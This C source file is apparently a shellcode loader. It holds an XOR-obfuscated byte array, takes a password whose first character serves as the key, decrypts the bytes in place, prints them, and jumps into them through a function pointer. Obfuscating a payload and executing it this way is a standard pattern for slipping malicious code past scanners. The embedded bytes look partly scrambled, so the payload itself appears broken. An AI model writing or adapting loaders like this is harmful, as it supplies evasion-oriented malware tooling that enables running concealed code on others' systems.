#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// XOR Decryption Function
void xor_encrypt_decrypt(unsigned char *data, size_t length, unsigned char key) {
    for (size_t i = 0; i < length; i++) {
        data[i] ^= key;
    }
}

// Encrypted shellcode in hex format
unsigned char encrypted_shellcode[] = {
    0xd8, 0x2f, 0x47, 0x67, 0x27, 0x67, 0x67, 0x67, 0x67, 0x56, 0x2f, 0x2f, 0x91, 0xb5, 0x56,
    0x5c, 0xdf, 0x67, 0x67, 0x68, 0x67, 0x2f, 0x62, 0x98, 0x56, 0x5b, 0xdf, 0x67, 0x67, 0x68,
    0x67, 0x67, 0x67, 0x67, 0x67, 0x67, 0x67, 0x67, 0x67, 0x67, 0x67, 0x67, 0x67, 0x67, 0x67,
    0x67, 0x67, 0x67, 0x67, 0x05, 0x48, 0x09, 0x0e, 0x14, 0x48, 0x67, 0x0f, 0x49, 0x67, 0x0f,
    0x14, 0x13, 0x14, 0x13, 0x15, 0x05, 0x06, 0x49, 0x67, 0x02, 0x13, 0x13, 0x1f, 0x49, 0x67,
    0x06, 0x03, 0x06, 0x13, 0x67, 0x67, 0x67, 0x67, 0x67, 0x67, 0x67, 0x67, 0x67, 0x67, 0x67
};

// Length of the encrypted shellcode
#define ENCRYPTED_SHELLCODE_LENGTH sizeof(encrypted_shellcode)

int main() {
    unsigned char key;
    char password[256];

    // Ask for the password
    printf("Enter the password: ");
    if (fgets(password, sizeof(password), stdin) == NULL) {
        perror("fgets");
        exit(EXIT_FAILURE);
    }

    // Remove newline character from password
    size_t len = strlen(password);
    if (len > 0 && password[len - 1] == '\n') {
        password[len - 1] = '\0';
    }

    // Simple password-to-key conversion (e.g., use the first byte of the password as the key)
    key = password[0];  // For simplicity, use the first character of the password as the key

    // Decrypt the shellcode
    xor_encrypt_decrypt(encrypted_shellcode, ENCRYPTED_SHELLCODE_LENGTH, key);

    // Optionally print the decrypted shellcode for verification
    printf("Decrypted shellcode:\n");
    for (size_t i = 0; i < ENCRYPTED_SHELLCODE_LENGTH; i++) {
        printf("%02x ", encrypted_shellcode[i]);
    }
    printf("\n");

    // Execute the shellcode
    void (*func)() = (void (*)())encrypted_shellcode;
    func();

    return 0;
}
